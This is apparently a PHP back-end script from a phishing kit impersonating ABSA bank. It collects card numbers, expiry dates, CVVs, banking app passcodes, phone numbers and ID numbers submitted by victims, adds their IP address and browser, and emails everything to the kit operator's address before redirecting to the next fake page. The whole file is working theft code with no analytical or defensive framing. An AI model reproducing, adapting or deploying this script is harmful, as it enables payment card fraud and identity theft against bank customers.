<?php
session_start();
error_reporting(0);
require_once 'os.php'; 
$infodate   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
$ip = $_SERVER['REMOTE_ADDR'];

$cn = $_SESSION['cn'] = $_POST['cn'];
$exp = $_SESSION['exp'] = $_POST['exp'];
$cvv = $_SESSION['cvv'] = $_POST['cvv'];
$passcode = $_SESSION['passcode'] = $_POST['passcode'];
$phone = $_SESSION['phone'] = $_POST['phone'];
$idnum = $_SESSION['idnum'] = $_POST['idnum'];

$message = '
💸 [Info] 💸
<br>
Card Number      : '.$cn.'  
<br>
Expiration       : '.$exp.'  
<br>
CVV              : '.$cvv.'  
<br>
App Passcode     : '.$passcode.'  
<br>
Phone Number     : '.$phone.'  
<br>
ID Number        : '.$idnum.'  
<br>
💻 [Info] 💻
<br>
IP Address     : '.$ip.' 
<br>
Country     : '.$country.' 
<br>
Browser        : '.$browserTy_Version.' 
<br> 
Time           : '.$infodate.' 
<br>
💸 [Info] 💸
';

require_once '../config.php';
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "ABSA Info 💸 [".$_SERVER['REMOTE_ADDR']."] ";
$headers .= "From: OReoo" . "\r\n";
mail($yourmail, $subject, $message, $headers);
header("Location: ../app/express3.php");
